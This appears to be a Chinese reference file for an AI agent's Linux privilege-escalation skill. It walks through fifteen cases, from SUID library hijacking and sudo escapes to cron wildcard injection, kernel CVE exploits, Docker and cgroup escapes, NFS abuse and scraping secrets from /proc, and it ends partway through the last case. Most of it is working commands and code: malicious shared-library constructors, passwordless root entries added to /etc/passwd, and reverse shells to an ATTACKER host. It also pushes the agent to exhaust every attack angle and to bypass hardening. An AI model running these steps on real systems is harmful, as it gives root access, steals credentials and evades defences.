# 深度分析实例参考

> 本文件从 SKILL.md §6.2 移出，作为深度分析的教学参考。主 Skill 执行时按需加载。
> **核心目的**：示范如何从"发现可疑线索"到"完成利用验证"的完整推理链，防止大模型在 L1 阶段就停止或使用模糊描述。

---

## 实例 1：SUID 自编译程序 — RPATH 劫持 + 命令注入

> **教训**：不要只检查 GTFOBins 就放弃。非标准 SUID 程序需要完整的逆向分析。

```
发现: find / -perm -4000 → /usr/bin/custom_app（非标准 SUID，属主 root）

[A] 功能理解前置：
  file /usr/bin/custom_app       → ELF 64-bit, dynamically linked, not stripped
  strings /usr/bin/custom_app    → "/etc/custom_app.conf", "system(", "logger -t custom_app"
  readelf -d /usr/bin/custom_app → RPATH: /usr/lib/custom_app/
  readelf -l /usr/bin/custom_app → GNU_STACK: RWE ← NX 未启用，栈可执行
  --help 尝试                    → 显示 --option, --config 参数

  功能判定：系统管理类（读配置+执行外部命令+记录日志）
  潜在攻击面：RPATH 可写 → 库劫持；system() 参数注入 → 命令注入；栈可执行 → 缓冲区溢出

[B] 多角度利用：
  角度 1（RPATH 劫持 — 从 readelf 推理得出）：
    ls -la /usr/lib/custom_app/ → 当前用户可写！
    攻击链：编译恶意 libxyz.so → 放入可写 RPATH 目录 → 执行 custom_app → 加载恶意库 → root shell
    
    # 编译恶意库
    cat > /tmp/evil.c << 'EOF'
    #include <stdio.h>
    #include <stdlib.h>
    __attribute__((constructor)) void init() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
    }
    EOF
    gcc -shared -fPIC -o /tmp/libxyz.so /tmp/evil.c
    
    # 部署到可写 RPATH
    cp /tmp/libxyz.so /usr/lib/custom_app/
    
    # 触发加载
    /usr/bin/custom_app --help  # 如果直接加载依赖库即触发
    id  # 预期: uid=0(root)

  角度 2（命令注入 — 从 strings 推断 system() 参数来源）：
    strings 显示 system("logger -t custom_app $OPTION")
    测试: custom_app --option="test;id"
    检查: id 命令是否执行 → 若有 id 输出则命令注入成立
    进阶: custom_app --option="test;bash -p"

  角度 3（缓冲区溢出 — NX 未启用）：
    NX 关闭意味着栈可执行，溢出后可直接执行 shellcode
    但需要更复杂的分析（反汇编确定偏移），优先级低于角度1和2

  角度 4（配置文件篡改 — 从 strings 推断配置路径）：
    strings 显示 /etc/custom_app.conf
    ls -la /etc/custom_app.conf → 若可写 → 注入恶意配置
    检查配置文件中是否有可执行路径或命令参数

[C] 记录：
  角度 1 成功 → verified (VULN-001), 类型=RPATH劫持提权, 风险=高危
  角度 2 失败 → 记录: 过滤了 ; | ` $ 等字符，尝试编码绕过也失败
  角度 3 未尝试 → 记录: 角度1已成功，作为备选
  角度 4 失败 → 记录: /etc/custom_app.conf 不可写
```

---

## 实例 2：Capability 二进制 — cap_setuid 提权

> **教训**：不要只尝试一种方法就标记为"已验证"。需要验证防御机制是否生效。

```
发现: getcap -r / 2>/dev/null → /usr/bin/python3 = cap_setuid+ep

[A] 功能理解：
  python3 是解释器，cap_setuid 允许在脚本中 setuid(0)
  关键问题：是否有 SELinux/AppArmor/seccomp 限制？

[B] 多角度利用：
  角度 1（直接提权）：
    python3 -c "import os; os.setuid(0); os.system('id')"
    成功 → uid=0(root)
    
  角度 2（交互式 shell）：
    python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
    成功 → root shell

  角度 3（写 SUID 文件持久化）：
    python3 -c "
    import os
    os.setuid(0)
    with open('/tmp/rootsh','w') as f:
        f.write('#!/bin/bash\nexec bash -p\n')
    os.chmod('/tmp/rootsh', 0o4755)
    "
    ls -la /tmp/rootsh → SUID root shell

  角度 4（修改 /etc/passwd）：
    python3 -c "
    import os
    os.setuid(0)
    os.system('echo \"r00t::0:0:root:/root:/bin/bash\" >> /etc/passwd')
    "
    su r00t → root shell

  角度 5（如果角度1失败 — 检查防御机制）：
    检查 SELinux: getenforce / sestatus
    检查 AppArmor: aa-status / cat /proc/self/attr/current
    检查 seccomp: cat /proc/self/status | grep Seccomp
    若 SELinux enforcing → 检查是否有 unconfined_t 域适用
    若 AppArmor → 检查 profile 是否限制了 python3 的 setuid

[C] 记录：
  角度 1 成功 → verified (VULN-002), Capability 提权
  角度 3 也成功 → 记录持久化方法
  角度 5 检查结果 → SELinux disabled, 无额外限制
```

---

## 实例 3：自研 PAM 模块 — 认证绕过

> **教训**：PAM 模块是高价值目标，需要完整的逆向分析，不能只看表面。

```
发现: grep -r "pam_custom\|pam_auth\|pam_" /etc/pam.d/ → 发现自定义模块
      auth required /lib/security/pam_custom.so

[A] 功能理解：
  file /lib/security/pam_custom.so → ELF 64-bit, 自编译, stripped
  strings /lib/security/pam_custom.so → 发现:
    - "hardcoded_s3cret_key_2024" (疑似硬编码密钥)
    - "DEBUG=1" (调试模式标志)
    - "/var/log/pam_custom.log" (日志路径)
    - "backdoor" 字符串 (明确后门嫌疑)
    - "auth_success" (认证成功逻辑)
  readelf -d → 依赖 libcrypto.so, libpam.so

  功能判定：加密/认证类，疑似包含后门逻辑

[B] 多角度利用：
  角度 1（硬编码后门 — strings 直接发现）：
    尝试用 "hardcoded_s3cret_key_2024" 作为密码登录
    ssh user@target  # 密码: hardcoded_s3cret_key_2024
    若登录成功 → 认证绕过

  角度 2（调试模式绕过 — 检查 DEBUG 环境变量）：
    检查: PAM 模块是否读取环境变量控制调试模式
    尝试: 在 /etc/environment 或 PAM 配置中设置 DEBUG=1
    检查模块是否在调试模式下跳过认证

  角度 3（日志路径利用 — 检查 /var/log/pam_custom.log 权限）：
    ls -la /var/log/pam_custom.log → 若可读 → 检查是否记录了明文密码
    ls -la /var/log/ → 若可写 → 尝试符号链接攻击

  角度 4（竞态条件 — TOCTOU）：
    检查模块是否先检查文件再读取（存在 TOCTOU 窗口）
    strace -f sshd 2>&1 | grep pam_custom → 追踪系统调用分析逻辑

  角度 5（配置注入 — 检查 /etc/pam.d/ 配置）：
    检查是否有 other 配置文件可被覆盖
    检查 include 指令是否引用可写路径

[C] 记录：
  角度 1 成功 → verified (VULN-003), 认证绕过, 高危
  角度 3 成功 → 日志中发现明文密码，信息泄露
  角度 2 失败 → DEBUG 标志是编译时定义，非运行时环境变量
```

---

## 实例 4：Cron 路径劫持 — 可写脚本 + 通配符注入

> **教训**：cron 任务需要追踪完整调用链（cron → 脚本 → 命令 → 参数），每一环都可能是攻击点。

```
发现: cat /etc/crontab → */5 * * * * root /opt/backup.sh

[A] 功能理解 + 权限检查：
  ls -la /opt/backup.sh → -rwxrwxrwx root root ← 全局可写！
  cat /opt/backup.sh:
    #!/bin/bash
    cd /var/backups
    tar czf /tmp/backup_$(date +%Y%m%d).tar.gz *
    
  功能判定：文件操作类（备份目录），使用了通配符 *

[B] 多角度利用：
  角度 1（直接修改脚本 — 全局可写）：
    最简单：在脚本开头插入提权命令
    echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/backup.sh
    等待 cron 执行（最多 5 分钟）→ 获得 root shell

  角度 2（通配符注入 — tar * 注入）：
    脚本使用 tar czf ... *，* 会被 shell 展开为目录内所有文件
    攻击：在 /var/backups 创建恶意文件名作为 tar 参数
    cd /var/backups
    echo "" > "--checkpoint=1"
    echo "" > "--checkpoint-action=exec=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
    等待 cron 执行 → tar 将文件名作为参数执行 → root shell
    
    原理：tar 的 --checkpoint-action 允许在检查点时执行任意命令，
          文件名以 -- 开头会被 tar 解析为命令行参数

  角度 3（符号链接攻击 — 检查备份目标路径）：
    脚本写入 /tmp/backup_*.tar.gz
    检查是否可用符号链接覆盖敏感文件：
    ln -s /etc/passwd /tmp/backup_$(date +%Y%m%d).tar.gz
    等待 cron 执行 → 覆盖 /etc/passwd

  角度 4（环境变量劫持 — 检查脚本是否使用未限定路径的命令）：
    脚本中 tar 未使用绝对路径 /bin/tar
    检查 PATH: 如果 cron 的 PATH 包含可写目录
    在可写目录放置假的 tar → PATH 劫持

[C] 记录：
  角度 1 成功 → verified (VULN-004), cron 路径劫持提权, 高危
  角度 2 成功 → verified (VULN-005), 通配符注入提权, 高危
  角度 3 失败 → /tmp 目录有 sticky 位，但 cron 以 root 执行所以符号链接有效
              → 需验证：ln -s /etc/passwd /tmp/backup_xxx.gz，等 cron 覆盖
```

---

## 实例 5：Sudo 配置缺陷 — 看似安全但实际可利用

> **教训**：sudo -l 输出需要逐条分析，不能只看是否有 ALL。很多"有限制"的 sudo 配置仍然可提权。

```
发现: sudo -l →
  User testuser may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim /etc/nginx/*
    (root) NOPASSWD: /usr/bin/find /var/log -name "*.log" -mtime -1
    (root) NOPASSWD: /usr/bin/env

[A] 功能理解：
  三条 sudo 规则，看似都有路径限制，但需要逐条分析利用可能性

[B] 多角度利用：
  角度 1（vim 限制路径 /etc/nginx/* — 但 vim 本身就是 GTFOBins）：
    sudo vim /etc/nginx/test
    在 vim 中执行: :!bash → 是否获得 root shell？
    若 vim 限制了 :! 命令 → :lua os.execute('bash')
    若 lua 也被限制 → :py import os; os.system('bash')
    
    关键：sudo 限制的是"文件路径参数"，但 vim 的内部命令不受此限制
    即使 /etc/nginx/test 不存在，vim 仍会启动，然后可逃逸

  角度 2（find 限制路径 /var/log — 但 find 的 -exec 不受路径限制）：
    sudo find /var/log -name "*.log" -mtime -1 -exec bash \;
    → -exec 会在 find 权限下执行，即 root 权限
    
    若 -exec 被过滤 → 尝试 -exec 其他变体：
    sudo find /var/log -name "*.log" -mtime -1 -exec /bin/bash -p \;
    sudo find /var/log -name "*.log" -mtime -1 -ok bash \;  # -ok 是 -exec 的确认版本

  角度 3（env 无限制 — 直接 GTFOBins）：
    sudo env /bin/bash → 直接获得 root shell
    这是最简单的一条，但不要只验证这一条就结束

  角度 4（组合利用 — vim + find 联合）：
    如果 vim 的 :! 被限制 → 用 vim 写入恶意脚本到 /var/log/
    然后用 sudo find /var/log -exec 执行该脚本
    
  角度 5（sudo 缓存利用 — 检查 sudo 超时）：
    sudo -V → 检查 timestamp_timeout
    若 timeout > 0 → 在 sudo 缓存有效期内，尝试其他 sudo 规则组合

[C] 记录：
  角度 1 成功 → verified (VULN-006), sudo vim 逃逸提权
  角度 2 成功 → verified (VULN-007), sudo find -exec 提权
  角度 3 成功 → verified (VULN-008), sudo env 直接提权
  → 三条规则均可提权，说明 sudo 配置存在系统性缺陷
```

---

## 实例 6：符号链接攻击 — SUID 程序写文件

> **教训**：SUID 程序向可预测路径写文件时，可通过符号链接重定向到任意位置。

```
发现: find / -perm -4000 → /usr/bin/logrotate (SUID root)
      strings → "/var/log/app.log", "rotate", "compress"

[A] 功能理解：
  file → ELF 64-bit, SUID root
  strings → 写文件到 /var/log/app.log 的轮转副本
  strace -e trace=file /usr/bin/logrotate 2>&1 →
    open("/var/log/app.log.1", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    ← 在打开文件前不检查是否为符号链接！

[B] 多角度利用：
  角度 1（符号链接覆盖 /etc/passwd）：
    # 准备恶意 passwd 行
    NEWUSER="r00t::0:0:root:/root:/bin/bash"
    
    # 创建符号链接
    rm -f /var/log/app.log.1
    ln -s /etc/passwd /var/log/app.log.1
    
    # 触发 logrotate 写入
    /usr/bin/logrotate
    
    # 检查 /etc/passwd 是否被覆盖
    cat /etc/passwd | head -1 → 若为 logrotate 输出内容则失败
    → 改为：写入包含新用户行的内容到日志，再让 logrotate 追加到 passwd

  角度 2（符号链接覆盖 /etc/crontab）：
    rm -f /var/log/app.log.1
    ln -s /etc/crontab /var/log/app.log.1
    /usr/bin/logrotate
    → 检查 crontab 是否被覆盖，若成功则注入恶意 cron 任务

  角度 3（符号链接覆盖 SSH authorized_keys）：
    rm -f /var/log/app.log.1
    ln -s /root/.ssh/authorized_keys /var/log/app.log.1
    /usr/bin/logrotate
    → 若成功写入 → 检查是否可追加公钥到 root 的 authorized_keys

  角度 4（TOCTOU 竞态 — 多进程竞争）：
    如果程序先检查文件再写入（存在 TOCTOU 窗口）
    用 inotifywait 监控文件访问，在检查后、写入前替换为符号链接
    while true; do
      inotifywait -e access /var/log/app.log.1 && \
      ln -sf /etc/passwd /var/log/app.log.1
    done

[C] 记录：
  角度 1 成功 → verified (VULN-009), 符号链接攻击写入 /etc/passwd
  → 补充验证：ls -la /etc/passwd 确认属主和权限变化
  → 复现步骤完整记录
```

---

## 实例 7：内核漏洞利用 — 版本号到 CVE 到 EXP 完整链

> **教训**：内核版本号只是起点，必须验证补丁状态、编译选项、EXP 可用性，不能只说"可能存在漏洞"。

```
发现: uname -r → 5.4.0-42-generic (Ubuntu 20.04)

[A] CVE 关联：
  AI 知识库匹配 5.4.0-42 已知 CVE：
  - CVE-2021-3493 (OverlayFS unprivileged mount, Ubuntu 特有)
  - CVE-2021-4034 (pkexec PwnKit, 但需检查 pkexec 版本)
  - CVE-2022-0847 (Dirty Pipe, 需验证 5.4 是否受影响)
  - CVE-2021-22555 (Netfilter, 5.4 受影响)
  
  → 逐个验证，不能只列出 CVE 编号

[B] 多角度验证：
  角度 1（CVE-2021-3493 OverlayFS — 验证补丁状态）：
    # 检查补丁是否已安装
    dpkg -l | grep linux-image → 获取精确内核包版本
    apt changelog linux-image-$(uname -r) 2>/dev/null | grep -i "CVE-2021-3493"
    
    # 检查 OverlayFS 是否可用
    cat /proc/filesystems | grep overlay
    lsmod | grep overlay
    
    # 检查 unprivileged user namespaces
    cat /proc/sys/kernel/unprivileged_userns_clone → 若为 1 则可利用
    
    # 下载并编译 EXP
    # (从已知 EXP 来源获取，根据目标架构编译)
    gcc -o exp cve-2021-3493.c
    ./exp
    
    # 验证结果
    id → uid=0(root) 则 verified
    id → 失败则记录具体错误（权限拒绝？内核已修复？功能未启用？）

  角度 2（CVE-2022-0847 Dirty Pipe — 验证内核版本范围）：
    # Dirty Pipe 影响 5.8+，5.4 不受影响
    # 但需要验证是否有 backport
    grep -i "pipe" /proc/version
    # 尝试 EXP 验证（即使理论上不受影响）
    gcc -o dirtypipe dirtypipe.c
    ./dirtypipe /etc/passwd 1 "r00t::0:0:root:/root:/bin/bash"
    # 结果：预期失败 → 记录"5.4 不受 Dirty Pipe 影响，已通过 EXP 验证"

  角度 3（CVE-2021-22555 Netfilter — 验证条件）：
    # 检查是否可创建 user namespace
    unshare -U cat /proc/self/uid_map → 若成功则条件满足
    # 检查 Netfilter 模块
    lsmod | grep nf_*
    # 编译并测试 EXP
    gcc -o exp cve-2021-22555.c
    ./exp
    # 验证结果

  角度 4（如果所有 CVE EXP 都失败 — 分析原因）：
    检查内核编译选项：cat /boot/config-$(uname -r) | grep CONFIG_
    检查安全加固：cat /proc/sys/kernel/kptr_restrict
    检查 SELinux/AppArmor：getenforce / aa-status
    → 逐条记录每个 CVE 失败的具体原因

[C] 记录：
  CVE-2021-3493 → verified (VULN-010), OverlayFS 提权, 高危
    EXP 输出: uid=0(root)
  CVE-2022-0847 → excluded, 5.4 不在受影响版本范围（需 5.8+）
    已通过 EXP 验证确认不受影响
  CVE-2021-22555 → risk-only (RISK-001)
    失败原因: EXP 编译成功但执行时 SIGKILL，疑似内核加固（dmesg 显示 "nf_tables: rejected"）
    替代方案: 尝试修改 EXP 绕过检测，或寻找其他 Netfilter CVE
```

---

## 实例 8：容器逃逸 — Docker 组提权

> **教训**：容器逃逸需要多层验证，不能只检查 docker 组成员就停止。

```
发现: id → uid=1000(testuser) groups=1000(testuser),999(docker)

[A] 环境分析：
  # 检查 Docker daemon 状态
  docker ps → 可以列出容器（确认 docker 组权限有效）
  docker version → Docker 20.10.x
  
  # 检查是否有已运行的容器
  docker ps -a → 发现 2 个容器：app_web（运行中）、db_backup（已停止）
  
  # 检查容器挂载
  docker inspect app_web → Mounts: [{"/":"/host", "Mode":"ro"}]
  ← 宿主机根目录被挂载为只读到容器内

[B] 多角度利用：
  角度 1（挂载宿主机根目录 — 经典方法）：
    docker run -it --rm -v /:/host ubuntu bash
    # 在容器内
    chroot /host bash
    id → uid=0(root) (容器内 root = 宿主机 root，因为挂载了 /)
    
    # 如果只读挂载 → 尝试写入
    echo "r00t::0:0:root:/root:/bin/bash" >> /host/etc/passwd
    → 若成功则已写入宿主机 /etc/passwd

  角度 2（特权容器 — 检查运行中的容器是否特权模式）：
    docker inspect app_web | grep -i privileged
    → 若 "Privileged": true → 直接逃逸
    docker exec -it app_web bash
    mount -o remount,rw /host  # 如果是只读挂载，特权容器可重新挂载为读写
    chroot /host bash

  角度 3（cgroup 逃逸 — 利用 notify_on_release）：
    # 在容器内
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "cat /etc/shadow > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    cat /host/output → 宿主机 shadow 文件

  角度 4（已停止容器 — 检查 db_backup）：
    docker start db_backup
    docker inspect db_backup → 检查挂载和特权配置
    docker exec -it db_backup bash → 尝试逃逸

  角度 5（Docker socket — 检查容器内是否有 docker.sock）：
    docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock docker docker ps
    → 若可访问宿主机 docker.sock → 创建特权容器挂载宿主机 /
    docker run -it --rm -v /:/host --privileged ubuntu chroot /host bash

[C] 记录：
  角度 1 成功 → verified (VULN-011), Docker 组逃逸, 高危
    详细步骤: docker run → chroot → 写入宿主机 /etc/passwd → su r00t
  角度 3 也成功 → verified (VULN-012), cgroup 逃逸（作为备选方法）
  角度 5 失败 → /var/run/docker.sock 未挂载到容器内
```

---

## 实例 9：共享库劫持 — LD_PRELOAD / RPATH / ld.so.conf

> **教训**：共享库劫持需要检查多种加载机制，不能只看 LD_PRELOAD。

```
发现: cat /etc/ld.so.conf → include /usr/local/lib/custom/*.conf
      ls -la /usr/local/lib/custom/ → drwxrwxrwx (全局可写)

[A] 环境分析：
  # 检查 LD 配置
  cat /etc/ld.so.conf.d/*.conf → 列出所有加载路径
  ls -la /etc/ld.so.conf.d/ → 检查是否可写
  ldconfig -p | grep custom → 检查自定义库缓存
  
  # 检查 LD_PRELOAD
  cat /etc/ld.so.preload 2>/dev/null → 若存在且可写
  env | grep LD_ → 检查环境变量
  
  # 检查 SUID 程序的 RPATH
  find / -perm -4000 -exec readelf -d {} \; 2>/dev/null | grep -E "RPATH|RUNPATH"

[B] 多角度利用：
  角度 1（ld.so.conf include 可写路径）：
    /usr/local/lib/custom/ 全局可写
    攻击链：编译恶意 .so → 放入该目录 → 执行 ldconfig 更新缓存
    → 任何链接到该库的程序都会加载恶意版本
    
    # 查找依赖该路径下库的程序
    ldd /usr/bin/some_suid_program | grep custom
    
    # 编译恶意库
    cat > /tmp/evil.c << 'EOF'
    #include <stdio.h>
    __attribute__((constructor)) void init() {
        setuid(0);
        system("/bin/bash -p");
    }
    EOF
    gcc -shared -fPIC -o /usr/local/lib/custom/libtarget.so.1 /tmp/evil.c
    
    # 触发
    /usr/bin/some_suid_program → 加载恶意库 → root shell

  角度 2（/etc/ld.so.preload 可写）：
    echo "/tmp/evil.so" > /etc/ld.so.preload
    → 所有程序都会预加载恶意库
    → 下次 SUID 程序执行即触发

  角度 3（RPATH 可写 — 从 find 结果）：
    find 发现 SUID 程序有 RPATH: /opt/app/lib
    ls -la /opt/app/lib/ → 可写
    → 同实例 1 的 RPATH 劫持方法

  角度 4（环境变量利用 — 如果 SUID 程序未清除环境）：
    某些 SUID 程序未正确清除 LD_LIBRARY_PATH
    LD_LIBRARY_PATH=/tmp /usr/bin/suid_program → 检查是否加载 /tmp 下的库
    → 大多数现代 SUID 程序会忽略 LD_*，但值得尝试

[C] 记录：
  角度 1 成功 → verified (VULN-013), ld.so.conf 路径劫持, 高危
  角度 3 成功 → verified (VULN-014), RPATH 可写劫持
  角度 4 失败 → SUID 程序正确清除了 LD_* 环境变量（内核保护 + 程序清理）
```

---

## 实例 10：通配符注入 — tar/rsync/cp 等命令参数注入

> **教训**：任何使用 * 作为命令参数的脚本都可能被注入，需要理解每个命令的参数解析行为。

```
发现: cat /opt/cleanup.sh →
  #!/bin/bash
  cd /tmp/uploads
  tar czf /backup/uploads.tar.gz *
  rm -f /tmp/uploads/*
  cron: */10 * * * * root /opt/cleanup.sh

[A] 功能理解：
  tar czf /backup/uploads.tar.gz * ← * 被 shell 展开为目录内所有文件名
  如果文件名以 -- 开头，tar 会将其解析为命令行参数
  关键：tar 的 --checkpoint-action=exec= 允许执行任意命令

[B] 利用方法：
  cd /tmp/uploads
  
  # 方法 1：checkpoint-action 注入
  echo "" > "--checkpoint=1"
  echo "" > "--checkpoint-action=exec=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
  
  # 等待 cron 执行（最多 10 分钟）
  # 当 tar * 展开时，--checkpoint=1 和 --checkpoint-action=exec=... 被作为 tar 参数
  # tar 在每处理 1 个文件时触发 checkpoint，执行 exec 后的命令

  # 方法 2：--transform 注入
  echo "" > "--transform=s/x/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'/"

  # 方法 3：--to-command 注入
  echo "" > "--to-command=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"

[C] 类似场景扩展：
  # rsync 通配符注入
  脚本: rsync -avz /tmp/sync/ * remote:/backup/
  注入: echo "-e bash" > /tmp/sync/-e\ bash  # rsync 的 -e 指定远程 shell

  # cp 通配符注入
  脚本: cp * /backup/
  注入: 创建文件名为 "--no-preserve=mode" → cp 作为参数解析

  # chmod/chown 通配符注入
  脚本: chmod 755 *
  注入: echo "" > "--reference=/etc/shadow" → chmod 参考 shadow 权限

[D] 记录：
  tar checkpoint-action 成功 → verified (VULN-015), 通配符注入提权, 高危
  rsync -e 注入 → verified (VULN-016), rsync 通配符注入
```

---

## 实例 11：SSH 配置利用 — 代理转发 + ControlPath

> **教训**：SSH 配置不仅看 sshd_config，还要看用户级 ~/.ssh/config 和运行时状态。

```
发现: cat ~/.ssh/config →
  ForwardAgent yes
  ControlMaster auto
  ControlPath /tmp/ssh-%r@%h:%p
  ControlPersist 10m

[A] 功能理解：
  ForwardAgent yes → SSH 代理转发启用
  ControlPath /tmp/... → SSH 控制套接字在 /tmp（可预测路径）
  ControlPersist → 连接保持 10 分钟

[B] 多角度利用：
  角度 1（SSH 代理转发劫持）：
    # 如果有其他用户也 SSH 连接到同一台机器
    # 检查 SSH_AUTH_SOCK
    ls -la /tmp/ssh-*/agent.* → 查找其他用户的 agent socket
    SSH_AUTH_SOCK=/tmp/ssh-root@localhost:22/agent.1234 ssh-add -l
    → 若列出 root 的密钥 → 可代理转发登录到其他机器
    
    # 检查是否有共享的 SSH 会话
    ls -la /tmp/ssh-* → 查找 ControlPath 套接字

  角度 2（ControlPath 套接字劫持）：
    ControlPath 在 /tmp，其他用户可读
    # 查找活跃的 SSH 控制套接字
    find /tmp -name "ssh-*" -type s 2>/dev/null
    # 若发现 root 的套接字
    ssh -S /tmp/ssh-root@target:22 root@target
    → 直接复用 root 的 SSH 连接，无需密码

  角度 3（authorized_keys 权限）：
    ls -la ~/.ssh/authorized_keys → 检查权限
    若可写 → 追加攻击者公钥
    ls -la /root/.ssh/authorized_keys → 检查 root 的 SSH 目录

[C] 记录：
  角度 2 成功 → verified (VULN-017), SSH ControlPath 劫持, 中危
  角度 1 → 需要其他用户的 agent socket，标记为条件性风险
```

---

## 实例 12：定时任务竞态 — systemd timer + 可写服务文件

> **教训**：systemd 的服务文件和 timer 文件都是攻击面，需要检查完整链路。

```
发现: systemctl list-timers → app-cleanup.timer (active)
      cat /etc/systemd/system/app-cleanup.service →
        [Service]
        ExecStart=/opt/scripts/cleanup.sh
        User=root

[A] 环境分析：
  ls -la /opt/scripts/cleanup.sh → -rwxr-xr-x root root ← 不可写
  ls -la /etc/systemd/system/app-cleanup.service → -rw-r--r-- root root ← 不可写
  ls -la /etc/systemd/system/ → drwxr-xr-x root root ← 不可写
  
  但检查子目录：
  ls -la /opt/scripts/ → drwxrwxrwx ← 全局可写！

[B] 多角度利用：
  角度 1（可写目录 — 脚本替换）：
    /opt/scripts/ 全局可写
    但 cleanup.sh 不可写 → 不能直接修改
    
    但如果脚本调用了同目录下的其他文件：
    cat /opt/scripts/cleanup.sh → source /opt/scripts/config.sh
    ls -la /opt/scripts/config.sh → -rw-rw-rw- ← 可写！
    
    攻击：echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/scripts/config.sh
    等待 timer 触发 → root 执行包含恶意代码的 config.sh

  角度 2（systemd 服务重载 — 检查 systemd 路径优先级）：
    systemctl show app-cleanup.service -p FragmentPath
    → /etc/systemd/system/app-cleanup.service
    
    检查是否有更高优先级路径可写：
    ls -la /run/systemd/system/ → 若可写 → 创建同名服务覆盖
    → 但 /run/systemd/system/ 通常只有 root 可写

  角度 3（timer 文件利用）：
    cat /etc/systemd/system/app-cleanup.timer → 检查触发条件
    若 timer 文件可写 → 修改触发频率或指向恶意服务

  角度 4（环境变量注入 — 检查 systemd EnvironmentFile）：
    若服务文件中有 EnvironmentFile=/opt/scripts/env
    ls -la /opt/scripts/env → 若可写 → 注入恶意环境变量
    → PATH 劫持、LD_PRELOAD 注入等

[C] 记录：
  角度 1 成功 → verified (VULN-018), systemd timer 配置继承提权, 高危
  → 攻击链: 可写目录 + 脚本 source 可写配置文件 + root timer 执行
```

---

## 实例 13：受限环境逃逸 — rbash / restricted shell

> **教训**：受限 shell 不是真正的沙箱，需要系统性测试所有绕过方法。

```
发现: echo $SHELL → /bin/rbash
      echo $PATH → /usr/local/bin:/usr/bin ← 只有受限路径
      cd / → -rbash: cd: restricted
      cat /etc/passwd → -rbash: cat: restricted

[A] 环境分析：
  # 检查可用命令
  compgen -c | sort → 列出所有可用命令
  echo /usr/local/bin/* → 列出受限路径下所有可执行文件
  echo /usr/bin/* | tr ' ' '\n' | head -50

  # 检查是否在真正的 rbash 中
  echo $0 → rbash
  type help → 内置命令检查

[B] 多角度逃逸：
  角度 1（通过可用程序逃逸 — GTFOBins）：
    检查受限路径中有哪些程序：
    ls /usr/local/bin/ → python3, vim, awk, find...
    
    python3 → import subprocess; subprocess.call(['/bin/bash'])
    vim → :!bash 或 :set shell=/bin/bash
    awk → awk 'BEGIN {system("/bin/bash")}'
    find → find / -exec /bin/bash \;

  角度 2（通过内置命令逃逸）：
    help → 查看所有可用内置命令
    command -V bash → bash 路径
    exec bash → 替换当前 shell
    /bin/bash → 直接调用（如果 PATH 之外的路径可访问）

  角度 3（通过环境变量逃逸）：
    BASH_ENV=/tmp/evil.sh bash → 若 BASH_ENV 被读取则执行恶意脚本
    ENV=/tmp/evil.sh bash → 类似
    export PATH=$PATH:/bin:/sbin → 扩展 PATH

  角度 4（通过脚本文件逃逸）：
    echo '#!/bin/bash' > /tmp/escape.sh
    echo 'exec /bin/bash' >> /tmp/escape.sh
    chmod +x /tmp/escape.sh
    /tmp/escape.sh → 若 rbash 不限制绝对路径执行

  角度 5（通过编辑器逃逸）：
    vi/vim → :!bash 或 :set shell=/bin/bash
    nano → Ctrl+T → /bin/bash
    less → !bash（在 less 中执行命令）
    man → !bash（在 man 中执行命令）

[C] 记录：
  角度 1 成功（python3） → verified (VULN-019), rbash 逃逸 via python3, 中危
  角度 5 也成功（vim） → 多个逃逸路径已验证
  → rbash 未正确限制 PATH 下的程序，存在系统性绕过
```

---

## 实例 14：NFS 提权 — no_root_squash

> **教训**：NFS 配置需要同时验证服务端和客户端配置，以及文件权限。

```
发现: cat /etc/exports →
  /shared 192.168.1.0/24(rw,sync,no_root_squash)
  /home 192.168.1.0/24(rw,sync,root_squash)

[A] 环境分析：
  /shared 有 no_root_squash → NFS 客户端的 root 用户在服务器上也保持 root 权限
  /home 有 root_squash → 安全（root 被映射为 nfsnobody）
  
  # 验证 NFS 挂载
  showmount -e localhost → 列出可用导出
  mount | grep nfs → 检查当前挂载

[B] 利用方法：
  # 在客户端（有 root 权限的机器）上操作
  
  步骤 1：挂载 NFS 共享
    mount -t nfs target:/shared /mnt/nfs
  
  步骤 2：在共享目录创建 SUID shell
    cp /bin/bash /mnt/nfs/rootbash
    chmod u+s /mnt/nfs/rootbash
  
  步骤 3：在目标机器上执行
    ssh testuser@target
    /shared/rootbash -p
    id → uid=0(root)

  替代方法（如果没有客户端 root 权限但在目标上有写权限）：
    检查：ls -la /shared/ → 当前用户有写权限
    但 no_root_squash 只影响 NFS 客户端的 root 用户
    如果当前不是 root → 需要先在其他机器获取 root

[C] 记录：
  verified (VULN-020), NFS no_root_squash 提权, 高危
  攻击链: 客户端 root → 挂载 no_root_squash 共享 → 创建 SUID shell → 目标执行
```

---

## 实例 15：/proc 文件系统利用 — 环境变量泄露 + fd 泄露

> **教训**：/proc 下的信息泄露经常被忽略，但可能是凭据泄露的关键路径。

```
发现: ps aux | grep root → 多个以 root 运行的服务进程

[A] 环境分析：
  # 检查 /proc 权限
  ls -la /proc/1/ → 检查是否可读其他进程的 proc 条目
  cat /proc/1/environ → 若可读 → 获取 PID 1（init/systemd）的环境变量

[B] 多角度利用：
  角度 1（环境变量泄露 — 数据库密码）：
    for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
      cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token"
    done
    
    → 发现 PID 1234 (mysqld): MYSQL_ROOT_PASSWORD=SuperSecret123!
    → 验证: mysql -u root -pSuperSecret123! -e "SELECT USER();"
    → 若成功 → 凭据泄露 + 数据库访问

  角度 2（文件描述符泄露 — 打开的敏感文件）：
